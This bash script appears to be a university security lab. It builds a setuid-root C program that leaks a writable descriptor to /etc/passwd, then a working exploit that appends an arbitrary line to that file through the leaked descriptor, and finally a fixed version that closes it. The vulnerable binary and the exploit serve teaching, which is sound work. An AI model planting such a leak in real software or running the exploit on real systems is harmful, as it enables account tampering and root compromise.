#!/bin/bash


# Exercicio 1
cat > passwdleak.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>

int main() {
    int fd;

    fd = open("/etc/passwd", O_WRONLY | O_APPEND);
    if (fd < 0) {
        perror("open /etc/passwd");
        exit(1);
    }

    printf("Passwd FD leaked: %d\n", fd);

    if (setuid(getuid()) == -1) {
        perror("setuid");
        exit(1);
    }

    execl("/bin/sh", "sh", NULL);
    perror("execl");
    return 0;
}
EOF

gcc -o passwdleak passwdleak.c
sudo chown root:root passwdleak
sudo chmod 4755 passwdleak

# Exercicio 2
# sudo -u a104355 ./passwdleak

# Exercicio 3
cat > exploit_passwdleak.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
    int fd = 3;
    const char *line = "ssi_demo:x:2001:2001:SSI Demo:/tmp:/usr/sbin/nologin\n";
    ssize_t n;

    if (argc >= 2) fd = atoi(argv[1]);
    if (argc >= 3) line = argv[2];

    n = write(fd, line, strlen(line));
    if (n < 0) {
        perror("write");
        return 1;
    }

    printf("Wrote %zd bytes to leaked FD %d\n", n, fd);
    return 0;
}
EOF
gcc -o exploit_passwdleak exploit_passwdleak.c
# ./exploit_passwdleak 3
# ./exploit_passwdleak 3 $'ssi_demo:x:2001:2001:SSI Demo:/tmp:/usr/sbin/nologin\n'

# Exercicio 4
cat > passwdleak_fixed.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>

int main() {
    int fd;

    fd = open("/etc/passwd", O_WRONLY | O_APPEND);
    if (fd < 0) {
        perror("open /etc/passwd");
        exit(1);
    }

    if (fcntl(fd, F_SETFD, FD_CLOEXEC) == -1) {
        perror("fcntl");
    }
    close(fd);

    if (setuid(getuid()) == -1) {
        perror("setuid");
        exit(1);
    }

    execl("/bin/sh", "sh", NULL);
    perror("execl");
    return 0;
}
EOF

gcc -o passwdleak_fixed passwdleak_fixed.c
sudo chown root:root passwdleak_fixed
sudo chmod 4755 passwdleak_fixed
